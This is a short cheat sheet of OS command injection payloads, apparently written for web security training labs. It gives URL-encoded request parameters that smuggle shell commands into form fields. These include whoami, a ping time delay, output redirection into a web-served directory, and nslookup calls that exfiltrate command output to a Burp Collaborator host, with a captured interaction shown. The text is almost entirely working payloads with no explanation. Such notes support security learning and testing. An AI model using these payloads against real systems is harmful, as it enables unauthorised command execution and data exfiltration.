# OS command injection

## OS command injection, simple case
```
productId=1&storeId=1+%26+whoami+%26
```

## Blind OS command injection with time delays
```
email=jan%40foo.net||ping+-c+10+127.0.0.1||
```

## Blind OS command injection with output redirection
```
email=jan%40foo.net||whoami>/var/www/images/whoami.txt||
```

## Blind OS command injection with out-of-band interaction
```
email=jan%40foo.net||nslookup+burpcollaborator.net||
```

## Blind OS command injection with out-of-band data exfiltration
```
email=||nslookup+`whoami`.ttqw3(...).burpcollaborator.net||
```
Burp Collaborator interaction: `peter-WZSq1i.ttqw3gbwcea26g1r6yl4nup1lsrif7.burpcollaborator.net.`